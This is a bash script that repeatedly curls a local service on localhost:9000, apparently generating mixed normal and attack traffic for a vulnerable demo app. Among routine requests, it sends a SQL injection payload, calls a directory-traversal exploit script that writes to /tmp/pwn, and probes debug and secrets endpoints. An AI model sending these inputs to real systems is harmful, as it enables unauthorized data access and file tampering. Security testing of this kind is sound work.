for i in {1..100}
do

    curl http://localhost:9000/customers/
    curl http://localhost:9000/customers/2
    curl http://localhost:9000/customers/
    curl http://localhost:9000/customers/1
    curl http://localhost:9000/customers/1
    curl http://localhost:9000/customers/1
    curl http://localhost:9000/customers/1
    sleep 30
done
sleep 10
for i in {1..100}
do
  curl "http://localhost:9000/checkAccount/admin/Joe'%20or%20'1'='1"  
done
sleep 20
for i in {1..100}
do
    curl http://localhost:9000/account
    curl http://localhost:9000/account/1
    curl http://localhost:9000/account/2
    curl http://localhost:9000/account/3
    curl http://localhost:9000/account/4
    curl http://localhost:9000/account/5
    curl http://localhost:9000/account/1
    sleep 30
done
sleep 5
for i in {1..100}
do
    python dirtraversalexploit.py http://localhost:9000/saveSettings ../../../../../../../tmp/pwn asd
done
sleep 20
for i in {1..100}
do
    curl -s localhost:9000/customers
    curl -s localhost:9000/saveSettings
    curl -s localhost:9000/loadSettings
    curl -s localhost:9000/debug
    curl -s localhost:9000/admin/printSecrets

done
for i in {1..100}
do
    curl http://localhost:9000/patient
    sleep 30
done
sleep 10

